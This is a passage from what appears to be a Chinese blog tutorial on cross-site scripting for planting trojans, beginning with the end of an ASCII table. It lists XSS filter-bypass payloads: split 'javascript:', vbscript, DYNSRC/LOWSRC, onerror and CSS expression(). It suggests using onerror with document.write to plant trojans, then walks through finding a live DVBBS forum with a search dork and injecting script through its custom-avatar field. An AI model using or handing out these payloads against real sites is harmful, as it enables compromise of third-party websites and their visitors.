+<TD><FONT class=font face=Simsun>P</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>21</FONT></TD>
+<TD><FONT class=font face=Simsun>11</FONT></TD>
+<TD><FONT class=font face=Simsun>17</FONT></TD>
+<TD><FONT class=font face=Simsun>dc1</FONT></TD>
+<TD><FONT class=font face=Simsun>121</FONT></TD>
+<TD><FONT class=font face=Simsun>51</FONT></TD>
+<TD><FONT class=font face=Simsun>81</FONT></TD>
+<TD><FONT class=font face=Simsun>Q</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>22</FONT></TD>
+<TD><FONT class=font face=Simsun>12</FONT></TD>
+<TD><FONT class=font face=Simsun>18</FONT></TD>
+<TD><FONT class=font face=Simsun>dc2</FONT></TD>
+<TD><FONT class=font face=Simsun>122</FONT></TD>
+<TD><FONT class=font face=Simsun>52</FONT></TD>
+<TD><FONT class=font face=Simsun>82</FONT></TD>
+<TD><FONT class=font face=Simsun>R</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>23</FONT></TD>
+<TD><FONT class=font face=Simsun>13</FONT></TD>
+<TD><FONT class=font face=Simsun>19</FONT></TD>
+<TD><FONT class=font face=Simsun>dc3</FONT></TD>
+<TD><FONT class=font face=Simsun>123</FONT></TD>
+<TD><FONT class=font face=Simsun>53</FONT></TD>
+<TD><FONT class=font face=Simsun>83</FONT></TD>
+<TD><FONT class=font face=Simsun>S</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>24</FONT></TD>
+<TD><FONT class=font face=Simsun>14</FONT></TD>
+<TD><FONT class=font face=Simsun>20</FONT></TD>
+<TD><FONT class=font face=Simsun>dc4</FONT></TD>
+<TD><FONT class=font face=Simsun>124</FONT></TD>
+<TD><FONT class=font face=Simsun>54</FONT></TD>
+<TD><FONT class=font face=Simsun>84</FONT></TD>
+<TD><FONT class=font face=Simsun>T</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>25</FONT></TD>
+<TD><FONT class=font face=Simsun>15</FONT></TD>
+<TD><FONT class=font face=Simsun>21</FONT></TD>
+<TD><FONT class=font face=Simsun>nak</FONT></TD>
+<TD><FONT class=font face=Simsun>125</FONT></TD>
+<TD><FONT class=font face=Simsun>55</FONT></TD>
+<TD><FONT class=font face=Simsun>85</FONT></TD>
+<TD><FONT class=font face=Simsun>U</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>26</FONT></TD>
+<TD><FONT class=font face=Simsun>16</FONT></TD>
+<TD><FONT class=font face=Simsun>22</FONT></TD>
+<TD><FONT class=font face=Simsun>syn</FONT></TD>
+<TD><FONT class=font face=Simsun>126</FONT></TD>
+<TD><FONT class=font face=Simsun>56</FONT></TD>
+<TD><FONT class=font face=Simsun>86</FONT></TD>
+<TD><FONT class=font face=Simsun>V</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>27</FONT></TD>
+<TD><FONT class=font face=Simsun>17</FONT></TD>
+<TD><FONT class=font face=Simsun>23</FONT></TD>
+<TD><FONT class=font face=Simsun>etb</FONT></TD>
+<TD><FONT class=font face=Simsun>127</FONT></TD>
+<TD><FONT class=font face=Simsun>57</FONT></TD>
+<TD><FONT class=font face=Simsun>87</FONT></TD>
+<TD><FONT class=font face=Simsun>W</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>30</FONT></TD>
+<TD><FONT class=font face=Simsun>18</FONT></TD>
+<TD><FONT class=font face=Simsun>24</FONT></TD>
+<TD><FONT class=font face=Simsun>can</FONT></TD>
+<TD><FONT class=font face=Simsun>130</FONT></TD>
+<TD><FONT class=font face=Simsun>58</FONT></TD>
+<TD><FONT class=font face=Simsun>88</FONT></TD>
+<TD><FONT class=font face=Simsun>X</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>31</FONT></TD>
+<TD><FONT class=font face=Simsun>19</FONT></TD>
+<TD><FONT class=font face=Simsun>25</FONT></TD>
+<TD><FONT class=font face=Simsun>em</FONT></TD>
+<TD><FONT class=font face=Simsun>131</FONT></TD>
+<TD><FONT class=font face=Simsun>59</FONT></TD>
+<TD><FONT class=font face=Simsun>89</FONT></TD>
+<TD><FONT class=font face=Simsun>Y</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>32</FONT></TD>
+<TD><FONT class=font face=Simsun>1a</FONT></TD>
+<TD><FONT class=font face=Simsun>26</FONT></TD>
+<TD><FONT class=font face=Simsun>sub</FONT></TD>
+<TD><FONT class=font face=Simsun>132</FONT></TD>
+<TD><FONT class=font face=Simsun>5a</FONT></TD>
+<TD><FONT class=font face=Simsun>90</FONT></TD>
+<TD><FONT class=font face=Simsun>Z</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>33</FONT></TD>
+<TD><FONT class=font face=Simsun>1b</FONT></TD>
+<TD><FONT class=font face=Simsun>27</FONT></TD>
+<TD><FONT class=font face=Simsun>esc</FONT></TD>
+<TD><FONT class=font face=Simsun>133</FONT></TD>
+<TD><FONT class=font face=Simsun>5b</FONT></TD>
+<TD><FONT class=font face=Simsun>91</FONT></TD>
+<TD><FONT class=font face=Simsun>[</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>34</FONT></TD>
+<TD><FONT class=font face=Simsun>1c</FONT></TD>
+<TD><FONT class=font face=Simsun>28</FONT></TD>
+<TD><FONT class=font face=Simsun>fs</FONT></TD>
+<TD><FONT class=font face=Simsun>134</FONT></TD>
+<TD><FONT class=font face=Simsun>5c</FONT></TD>
+<TD><FONT class=font face=Simsun>92</FONT></TD>
+<TD><FONT class=font face=Simsun>\</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>35</FONT></TD>
+<TD><FONT class=font face=Simsun>1d</FONT></TD>
+<TD><FONT class=font face=Simsun>29</FONT></TD>
+<TD><FONT class=font face=Simsun>gs</FONT></TD>
+<TD><FONT class=font face=Simsun>135</FONT></TD>
+<TD><FONT class=font face=Simsun>5d</FONT></TD>
+<TD><FONT class=font face=Simsun>93</FONT></TD>
+<TD><FONT class=font face=Simsun>]</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>36</FONT></TD>
+<TD><FONT class=font face=Simsun>1e</FONT></TD>
+<TD><FONT class=font face=Simsun>30</FONT></TD>
+<TD><FONT class=font face=Simsun>re</FONT></TD>
+<TD><FONT class=font face=Simsun>136</FONT></TD>
+<TD><FONT class=font face=Simsun>5e</FONT></TD>
+<TD><FONT class=font face=Simsun>94</FONT></TD>
+<TD><FONT class=font face=Simsun>^</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>37</FONT></TD>
+<TD><FONT class=font face=Simsun>1f</FONT></TD>
+<TD><FONT class=font face=Simsun>31</FONT></TD>
+<TD><FONT class=font face=Simsun>us</FONT></TD>
+<TD><FONT class=font face=Simsun>137</FONT></TD>
+<TD><FONT class=font face=Simsun>5f</FONT></TD>
+<TD><FONT class=font face=Simsun>95</FONT></TD>
+<TD><FONT class=font face=Simsun>_</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>40</FONT></TD>
+<TD><FONT class=font face=Simsun>20</FONT></TD>
+<TD><FONT class=font face=Simsun>32</FONT></TD>
+<TD><FONT class=font face=Simsun>sp</FONT></TD>
+<TD><FONT class=font face=Simsun>140</FONT></TD>
+<TD><FONT class=font face=Simsun>60</FONT></TD>
+<TD><FONT class=font face=Simsun>96</FONT></TD>
+<TD><FONT class=font face=Simsun>'</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>41</FONT></TD>
+<TD><FONT class=font face=Simsun>21</FONT></TD>
+<TD><FONT class=font face=Simsun>33</FONT></TD>
+<TD><FONT class=font face=Simsun>!</FONT></TD>
+<TD><FONT class=font face=Simsun>141</FONT></TD>
+<TD><FONT class=font face=Simsun>61</FONT></TD>
+<TD><FONT class=font face=Simsun>97</FONT></TD>
+<TD><FONT class=font face=Simsun>a</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>42</FONT></TD>
+<TD><FONT class=font face=Simsun>22</FONT></TD>
+<TD><FONT class=font face=Simsun>34</FONT></TD>
+<TD><FONT class=font face=Simsun>"</FONT></TD>
+<TD><FONT class=font face=Simsun>142</FONT></TD>
+<TD><FONT class=font face=Simsun>62</FONT></TD>
+<TD><FONT class=font face=Simsun>98</FONT></TD>
+<TD><FONT class=font face=Simsun>b</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>43</FONT></TD>
+<TD><FONT class=font face=Simsun>23</FONT></TD>
+<TD><FONT class=font face=Simsun>35</FONT></TD>
+<TD><FONT class=font face=Simsun>#</FONT></TD>
+<TD><FONT class=font face=Simsun>143</FONT></TD>
+<TD><FONT class=font face=Simsun>63</FONT></TD>
+<TD><FONT class=font face=Simsun>99</FONT></TD>
+<TD><FONT class=font face=Simsun>c</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>44</FONT></TD>
+<TD><FONT class=font face=Simsun>24</FONT></TD>
+<TD><FONT class=font face=Simsun>36</FONT></TD>
+<TD><FONT class=font face=Simsun>$</FONT></TD>
+<TD><FONT class=font face=Simsun>144</FONT></TD>
+<TD><FONT class=font face=Simsun>64</FONT></TD>
+<TD><FONT class=font face=Simsun>100</FONT></TD>
+<TD><FONT class=font face=Simsun>d</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>45</FONT></TD>
+<TD><FONT class=font face=Simsun>25</FONT></TD>
+<TD><FONT class=font face=Simsun>37</FONT></TD>
+<TD><FONT class=font face=Simsun>%</FONT></TD>
+<TD><FONT class=font face=Simsun>145</FONT></TD>
+<TD><FONT class=font face=Simsun>65</FONT></TD>
+<TD><FONT class=font face=Simsun>101</FONT></TD>
+<TD><FONT class=font face=Simsun>e</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>46</FONT></TD>
+<TD><FONT class=font face=Simsun>26</FONT></TD>
+<TD><FONT class=font face=Simsun>38</FONT></TD>
+<TD><FONT class=font face=Simsun>&amp;</FONT></TD>
+<TD><FONT class=font face=Simsun>146</FONT></TD>
+<TD><FONT class=font face=Simsun>66</FONT></TD>
+<TD><FONT class=font face=Simsun>102</FONT></TD>
+<TD><FONT class=font face=Simsun>f</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>47</FONT></TD>
+<TD><FONT class=font face=Simsun>27</FONT></TD>
+<TD><FONT class=font face=Simsun>39</FONT></TD>
+<TD><FONT class=font face=Simsun>`</FONT></TD>
+<TD><FONT class=font face=Simsun>147</FONT></TD>
+<TD><FONT class=font face=Simsun>67</FONT></TD>
+<TD><FONT class=font face=Simsun>103</FONT></TD>
+<TD><FONT class=font face=Simsun>g</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>50</FONT></TD>
+<TD><FONT class=font face=Simsun>28</FONT></TD>
+<TD><FONT class=font face=Simsun>40</FONT></TD>
+<TD><FONT class=font face=Simsun>(</FONT></TD>
+<TD><FONT class=font face=Simsun>150</FONT></TD>
+<TD><FONT class=font face=Simsun>68</FONT></TD>
+<TD><FONT class=font face=Simsun>104</FONT></TD>
+<TD><FONT class=font face=Simsun>h</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>51</FONT></TD>
+<TD><FONT class=font face=Simsun>29</FONT></TD>
+<TD><FONT class=font face=Simsun>41</FONT></TD>
+<TD><FONT class=font face=Simsun>)</FONT></TD>
+<TD><FONT class=font face=Simsun>151</FONT></TD>
+<TD><FONT class=font face=Simsun>69</FONT></TD>
+<TD><FONT class=font face=Simsun>105</FONT></TD>
+<TD><FONT class=font face=Simsun>i</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>52</FONT></TD>
+<TD><FONT class=font face=Simsun>2a</FONT></TD>
+<TD><FONT class=font face=Simsun>42</FONT></TD>
+<TD><FONT class=font face=Simsun>*</FONT></TD>
+<TD><FONT class=font face=Simsun>152</FONT></TD>
+<TD><FONT class=font face=Simsun>6a</FONT></TD>
+<TD><FONT class=font face=Simsun>106</FONT></TD>
+<TD><FONT class=font face=Simsun>j</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>53</FONT></TD>
+<TD><FONT class=font face=Simsun>2b</FONT></TD>
+<TD><FONT class=font face=Simsun>43</FONT></TD>
+<TD><FONT class=font face=Simsun>+</FONT></TD>
+<TD><FONT class=font face=Simsun>153</FONT></TD>
+<TD><FONT class=font face=Simsun>6b</FONT></TD>
+<TD><FONT class=font face=Simsun>107</FONT></TD>
+<TD><FONT class=font face=Simsun>k</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>54</FONT></TD>
+<TD><FONT class=font face=Simsun>2c</FONT></TD>
+<TD><FONT class=font face=Simsun>44</FONT></TD>
+<TD><FONT class=font face=Simsun>,</FONT></TD>
+<TD><FONT class=font face=Simsun>154</FONT></TD>
+<TD><FONT class=font face=Simsun>6c</FONT></TD>
+<TD><FONT class=font face=Simsun>108</FONT></TD>
+<TD><FONT class=font face=Simsun>l</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>55</FONT></TD>
+<TD><FONT class=font face=Simsun>2d</FONT></TD>
+<TD><FONT class=font face=Simsun>45</FONT></TD>
+<TD><FONT class=font face=Simsun>-</FONT></TD>
+<TD><FONT class=font face=Simsun>155</FONT></TD>
+<TD><FONT class=font face=Simsun>6d</FONT></TD>
+<TD><FONT class=font face=Simsun>109</FONT></TD>
+<TD><FONT class=font face=Simsun>m</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>56</FONT></TD>
+<TD><FONT class=font face=Simsun>2e</FONT></TD>
+<TD><FONT class=font face=Simsun>46</FONT></TD>
+<TD><FONT class=font face=Simsun>.</FONT></TD>
+<TD><FONT class=font face=Simsun>156</FONT></TD>
+<TD><FONT class=font face=Simsun>6e</FONT></TD>
+<TD><FONT class=font face=Simsun>110</FONT></TD>
+<TD><FONT class=font face=Simsun>n</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>57</FONT></TD>
+<TD><FONT class=font face=Simsun>2f</FONT></TD>
+<TD><FONT class=font face=Simsun>47</FONT></TD>
+<TD><FONT class=font face=Simsun>/</FONT></TD>
+<TD><FONT class=font face=Simsun>157</FONT></TD>
+<TD><FONT class=font face=Simsun>6f</FONT></TD>
+<TD><FONT class=font face=Simsun>111</FONT></TD>
+<TD><FONT class=font face=Simsun>o</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>60</FONT></TD>
+<TD><FONT class=font face=Simsun>30</FONT></TD>
+<TD><FONT class=font face=Simsun>48</FONT></TD>
+<TD><FONT class=font face=Simsun>0</FONT></TD>
+<TD><FONT class=font face=Simsun>160</FONT></TD>
+<TD><FONT class=font face=Simsun>70</FONT></TD>
+<TD><FONT class=font face=Simsun>112</FONT></TD>
+<TD><FONT class=font face=Simsun>p</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>61</FONT></TD>
+<TD><FONT class=font face=Simsun>31</FONT></TD>
+<TD><FONT class=font face=Simsun>49</FONT></TD>
+<TD><FONT class=font face=Simsun>1</FONT></TD>
+<TD><FONT class=font face=Simsun>161</FONT></TD>
+<TD><FONT class=font face=Simsun>71</FONT></TD>
+<TD><FONT class=font face=Simsun>113</FONT></TD>
+<TD><FONT class=font face=Simsun>q</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>62</FONT></TD>
+<TD><FONT class=font face=Simsun>32</FONT></TD>
+<TD><FONT class=font face=Simsun>50</FONT></TD>
+<TD><FONT class=font face=Simsun>2</FONT></TD>
+<TD><FONT class=font face=Simsun>162</FONT></TD>
+<TD><FONT class=font face=Simsun>72</FONT></TD>
+<TD><FONT class=font face=Simsun>114</FONT></TD>
+<TD><FONT class=font face=Simsun>r</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>63</FONT></TD>
+<TD><FONT class=font face=Simsun>33</FONT></TD>
+<TD><FONT class=font face=Simsun>51</FONT></TD>
+<TD><FONT class=font face=Simsun>3</FONT></TD>
+<TD><FONT class=font face=Simsun>163</FONT></TD>
+<TD><FONT class=font face=Simsun>73</FONT></TD>
+<TD><FONT class=font face=Simsun>115</FONT></TD>
+<TD><FONT class=font face=Simsun>s</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>64</FONT></TD>
+<TD><FONT class=font face=Simsun>34</FONT></TD>
+<TD><FONT class=font face=Simsun>52</FONT></TD>
+<TD><FONT class=font face=Simsun>4</FONT></TD>
+<TD><FONT class=font face=Simsun>164</FONT></TD>
+<TD><FONT class=font face=Simsun>74</FONT></TD>
+<TD><FONT class=font face=Simsun>116</FONT></TD>
+<TD><FONT class=font face=Simsun>t</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>65</FONT></TD>
+<TD><FONT class=font face=Simsun>35</FONT></TD>
+<TD><FONT class=font face=Simsun>53</FONT></TD>
+<TD><FONT class=font face=Simsun>5</FONT></TD>
+<TD><FONT class=font face=Simsun>165</FONT></TD>
+<TD><FONT class=font face=Simsun>75</FONT></TD>
+<TD><FONT class=font face=Simsun>117</FONT></TD>
+<TD><FONT class=font face=Simsun>u</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>66</FONT></TD>
+<TD><FONT class=font face=Simsun>36</FONT></TD>
+<TD><FONT class=font face=Simsun>54</FONT></TD>
+<TD><FONT class=font face=Simsun>6</FONT></TD>
+<TD><FONT class=font face=Simsun>166</FONT></TD>
+<TD><FONT class=font face=Simsun>76</FONT></TD>
+<TD><FONT class=font face=Simsun>118</FONT></TD>
+<TD><FONT class=font face=Simsun>v</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>67</FONT></TD>
+<TD><FONT class=font face=Simsun>37</FONT></TD>
+<TD><FONT class=font face=Simsun>55</FONT></TD>
+<TD><FONT class=font face=Simsun>7</FONT></TD>
+<TD><FONT class=font face=Simsun>167</FONT></TD>
+<TD><FONT class=font face=Simsun>77</FONT></TD>
+<TD><FONT class=font face=Simsun>119</FONT></TD>
+<TD><FONT class=font face=Simsun>w</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>70</FONT></TD>
+<TD><FONT class=font face=Simsun>38</FONT></TD>
+<TD><FONT class=font face=Simsun>56</FONT></TD>
+<TD><FONT class=font face=Simsun>8</FONT></TD>
+<TD><FONT class=font face=Simsun>170</FONT></TD>
+<TD><FONT class=font face=Simsun>78</FONT></TD>
+<TD><FONT class=font face=Simsun>120</FONT></TD>
+<TD><FONT class=font face=Simsun>x</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>71</FONT></TD>
+<TD><FONT class=font face=Simsun>39</FONT></TD>
+<TD><FONT class=font face=Simsun>57</FONT></TD>
+<TD><FONT class=font face=Simsun>9</FONT></TD>
+<TD><FONT class=font face=Simsun>171</FONT></TD>
+<TD><FONT class=font face=Simsun>79</FONT></TD>
+<TD><FONT class=font face=Simsun>121</FONT></TD>
+<TD><FONT class=font face=Simsun>y</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>72</FONT></TD>
+<TD><FONT class=font face=Simsun>3a</FONT></TD>
+<TD><FONT class=font face=Simsun>58</FONT></TD>
+<TD><FONT class=font face=Simsun>:</FONT></TD>
+<TD><FONT class=font face=Simsun>172</FONT></TD>
+<TD><FONT class=font face=Simsun>7a</FONT></TD>
+<TD><FONT class=font face=Simsun>122</FONT></TD>
+<TD><FONT class=font face=Simsun>z</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>73</FONT></TD>
+<TD><FONT class=font face=Simsun>3b</FONT></TD>
+<TD><FONT class=font face=Simsun>59</FONT></TD>
+<TD><FONT class=font face=Simsun>;</FONT></TD>
+<TD><FONT class=font face=Simsun>173</FONT></TD>
+<TD><FONT class=font face=Simsun>7b</FONT></TD>
+<TD><FONT class=font face=Simsun>123</FONT></TD>
+<TD><FONT class=font face=Simsun>{</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>74</FONT></TD>
+<TD><FONT class=font face=Simsun>3c</FONT></TD>
+<TD><FONT class=font face=Simsun>60</FONT></TD>
+<TD><FONT class=font face=Simsun>&lt;</FONT></TD>
+<TD><FONT class=font face=Simsun>174</FONT></TD>
+<TD><FONT class=font face=Simsun>7c</FONT></TD>
+<TD><FONT class=font face=Simsun>124</FONT></TD>
+<TD><FONT class=font face=Simsun>|</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>75</FONT></TD>
+<TD><FONT class=font face=Simsun>3d</FONT></TD>
+<TD><FONT class=font face=Simsun>61</FONT></TD>
+<TD><FONT class=font face=Simsun>=</FONT></TD>
+<TD><FONT class=font face=Simsun>175</FONT></TD>
+<TD><FONT class=font face=Simsun>7d</FONT></TD>
+<TD><FONT class=font face=Simsun>125</FONT></TD>
+<TD><FONT class=font face=Simsun>}</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>76</FONT></TD>
+<TD><FONT class=font face=Simsun>3e</FONT></TD>
+<TD><FONT class=font face=Simsun>62</FONT></TD>
+<TD><FONT class=font face=Simsun>&gt;</FONT></TD>
+<TD><FONT class=font face=Simsun>176</FONT></TD>
+<TD><FONT class=font face=Simsun>7e</FONT></TD>
+<TD><FONT class=font face=Simsun>126</FONT></TD>
+<TD><FONT class=font face=Simsun>~</FONT></TD></TR>
+<TR>
+<TD><FONT class=font face=Simsun>77</FONT></TD>
+<TD><FONT class=font face=Simsun>3f</FONT></TD>
+<TD><FONT class=font face=Simsun>63</FONT></TD>
+<TD><FONT class=font face=Simsun>?</FONT></TD>
+<TD><FONT class=font face=Simsun>177</FONT></TD>
+<TD><FONT class=font face=Simsun>7f</FONT></TD>
+<TD><FONT class=font face=Simsun>127</FONT></TD>
+<TD><FONT class=font face=Simsun>del</FONT></TD></TR></TBODY></TABLE>
+<P style="TEXT-INDENT: 2em">但是如果对方又过滤了“&amp;”号或“#”号该怎么办呢？ 我们可以试试下面这条XSS攻击测试代码：</P>
+<P style="TEXT-INDENT: 2em">&lt;img src=javascr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ipt:alert(“text-img”) &gt;&lt;/img&gt;</P>
+<P style="TEXT-INDENT: 2em">看到了没有？中间的一个[Tab]键弄出来的空白（这个空白叫做制表符）即可绕过这类过滤，呵呵！除此之外以下几个XSS攻击代码也可以绕过这种过滤。</P>
+<P style="TEXT-INDENT: 2em">&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;</P>
+<P style="TEXT-INDENT: 2em">&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"&gt;</P>
+<P style="TEXT-INDENT: 2em">&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;</P>
+<P style="TEXT-INDENT: 2em">当然，如果仅仅是过滤掉javas<WBR>cript:的话，我们其实还有一个非常简单的方法，不用javas<WBR>cript脚本！别忘了微软还为我们准备了VBScript啊！我们将代码简单的换成&lt;IMG SRC='vbscript:msgbox("XSS")'&gt;即可。</P>
+<P style="TEXT-INDENT: 2em">而如果对方过滤了“SRC”的话怎么办呢？呵呵！不急！我们还可以利用下面的XSS攻击代码绕过这种过滤，效果与利用SRC基本一致。</P>
+<P style="TEXT-INDENT: 2em">&lt;IMG DYNSRC="javas<WBR>cript:alert('XSS')"&gt;</P>
+<P style="TEXT-INDENT: 2em">&lt;IMG LOWSRC="javas<WBR>cript:alert('XSS')"&gt;</P>
+<P style="TEXT-INDENT: 2em">然而随着XSS攻击的频繁发生，程序员们都开始想着怎样避免漏洞的出现，于是他们过滤了制表符这类部常见的符号，过滤空格还过滤了javas<WBR>cript。</P>
+<P style="TEXT-INDENT: 2em">但是聪明的我们还可以利用事件和属性替换掉关键字，绕过监测，比如：</P>
+<P style="TEXT-INDENT: 2em">&lt;img src="#" on<WBR>error=alert(/error-text/) &gt;</P>
+<P style="TEXT-INDENT: 2em">由于HTML的脚本默认就是JavaS<WBR>cript，因此即便是我们不特别的声明，其中的alert(/error-text/)还是可以顺利执行，而它的执行利用的是错误事件on<WBR>error才得以完成的。有的初学朋友可能会头晕了，什么事件啊属性啊什么的，我不懂啊！呵呵，不要着急，对于初学的朋友，你只要记住其中的alert(/error-text/)可以换成其他JavaS<WBR>cript代码就可以了。</P>
+<P style="TEXT-INDENT: 2em">但是有的初学者不明白了，我们知道这些又有什么用呢？你可以将其换成&lt;img src="#" on<WBR>error=document.write('http:\/\/a1pass.blog.163.com\/') &gt;来实现挂马功能。而且到后期当你懂得一定的脚本知识时，你可以用它做更多的事。</P>
+<P style="TEXT-INDENT: 2em">哦，原来利用事件也能跨站，所以有的人又开始过滤事件，以使我们的on<WBR>error事件无法执行。但是“山穷水尽疑无路，柳暗花明又一村”，总使你过滤再多的事件，如果我自己构造一个呢？下面这段代码就是我构造的一个叫做“A1Pass”的事件，它的执行结果与通过on<WBR>error来执行JavaS<WBR>cript代码的结果是一样的。</P>
+<P style="TEXT-INDENT: 2em">&lt;img src="#" style="A1Pass:expr<WBR>ession(alert(/style -text/));"&gt;</P>
+<P style="TEXT-INDENT: 2em">执行结果如图6所示。</P>
+<P style="TEXT-INDENT: 2em"><IMG title="跨站挂马全攻略 - A1Pass - A1Pass的风清月朗居" style="DISPLAY: block; FILTER: ; WIDTH: 431px; HEIGHT: 275px; TEXT-ALIGN: center" height=275 alt="跨站挂马全攻略 - A1Pass - A1Pass的风清月朗居" hspace=0 src="/file/old/814_f74e5b1e8380e2494034170b.jpg" width=431 border=0 __1301281400140__="ev_2212839799"></P>
+<P style="TEXT-INDENT: 2em">我们甚至不要SRC并且脱离&lt;img&gt;标签都可以成功进行XSS攻击！例如下面那段XSS测试代码。</P>
+<P style="TEXT-INDENT: 2em">&lt; DIV style="A1Pass:expr<WBR>ession(alert(/style -text/));"&gt;</P>
+<P style="TEXT-INDENT: 2em">值得注意的是，通过style构造的事件会执行两次，而且当鼠标移过时也会再次触发style事件。</P>
+<P style="TEXT-INDENT: 2em">当然除此之外我们还可以利用其他未被过滤的事件，或者利用上面所说的制表符（Tab键）来分割被过滤的关键字，除此之外注释符号“/**/”也可以当作空格来用，例如：</P>
+<P style="TEXT-INDENT: 2em">&lt; img src="#"/**/on<WBR>error=alert(/error-text/) &gt;</P>
+<P style="TEXT-INDENT: 2em">讲到这里有的朋友可能已经按耐不住了，那我们应该怎样去挖掘这些漏洞呢？我可以很负责任的告诉你，在你理解这些XSS攻击方法的前提下，挖掘这些漏洞就显得比较简单了，我们下面进行一次XSS攻击的实验。</P>
+<P style="TEXT-INDENT: 2em">大家都知道，可以输入信息的地方才有可能构成XSS攻击，但是选择一个输入点的好坏直接关系到XSS攻击的威力与成功几率。</P>
+<P style="TEXT-INDENT: 2em">我们先从威力方面考虑，当然是用户浏览次数越多，交互越频繁的地方，你进行XSS攻击后的效果就越明显，就拿论坛来说，用户头像、签名等都是比较高效而且较易成功的XSS攻击点。</P>
+<P style="TEXT-INDENT: 2em">下面我们就拿一个动网论坛做一下实验。</P>
+<P style="TEXT-INDENT: 2em">第一步先在网上找一个动网论坛，关键字是POWERED BY DVBBS ，大家自己搜吧。找到后先查看自己的权限，因为我们要利用自定义头像进行XSS攻击，所以为了能自定义头像，我这里需要先发10篇帖子……</P>
+<P style="TEXT-INDENT: 2em">第二步开始验测，我们在动网“自定义头像地址：”中输入我们的XSS测试代码&lt;script&gt;alert(“text”)&lt; /script&gt;，然后点击保存。</P>
+<P style="TEXT-INDENT: 2em">但是我们刷新后并没有看到text弹出来啊！如图7，怎么办？首先我们在返回的页面信息中可以看到完整的XSS测试代码&lt;script&gt;alert(“text”)&lt; /script&gt;，这至少证明没有被过滤。</P>
+<P style="TEXT-INDENT: 2em"><IMG title="跨站挂马全攻略 - A1Pass - A1Pass的风清月朗居" style="DISPLAY: block; FILTER: ; WIDTH: 480px; HEIGHT: 177px; TEXT-ALIGN: center" height=177 alt="跨站挂马全攻略 - A1Pass - A1Pass的风清月朗居" hspace=0 src="/file/old/815_ccd735fc809ddcabfd037f0b.jpg" width=480 border=0 __1301281400140__="ev_7601603058"></P>
+<P style="TEXT-INDENT: 2em">&nbsp;</P>
+<P style="TEXT-INDENT: 2em">小技巧：如果我们在某一个页面提交完XSS代码，刷新后还能显示的话（例如完整显示&lt;script&gt;），那大多数的情况是这个站点存在XSS漏洞！只是还需要我们进一步去挖掘。</P>
+<P style="TEXT-INDENT: 2em">但是他为什么没有顺利执行呢？这时就需要我们察看网页的源代码了，我们在IE浏览器的页面中单击右键，选择“察看源文件（V）”选项，即可看到这个页面的HTML源代码，按[Ctrl]+[F]快捷键调出查找对话框，输入alert(“text”)后我们找到了如下代码：</P>
+<P style="TEXT-INDENT: 2em">&lt;a href="#" on<WBR>click="openScript('smiley.asp?t=1',650,400)" title="头像预览列表"&gt;[&lt;font color="#FF0000"&gt;头像预览&lt;/font&gt;]&lt;/a&gt;&lt;/td&gt;</P>
+<P style="TEXT-INDENT: 2em">&lt;td width="180" rowspan="2" valign="top" align="center"&gt;</P>
+<P style="TEXT-INDENT: 2em">&lt;img id="face" src="&lt;script&gt;alert(“text”)&lt; /script&gt;" width="120" height="120" /&gt;</P>
+<P style="TEXT-INDENT: 2em">&lt;/td&gt;&lt;/tr&gt;</P>
+<P style="TEXT-INDENT: 2em">大家可以看到我们的XSS测试代码确实没有被过滤，但是被&lt;img&gt;标签的“&lt; &gt;”给包围了，当然就不能执行了！我们怎么办呢？</P>
+<P style="TEXT-INDENT: 2em">这里给大家一个思路：逆向思考！我们怎样不被包围呢？呵呵！大家看看下面这段新构造的XSS测试代码。</P>
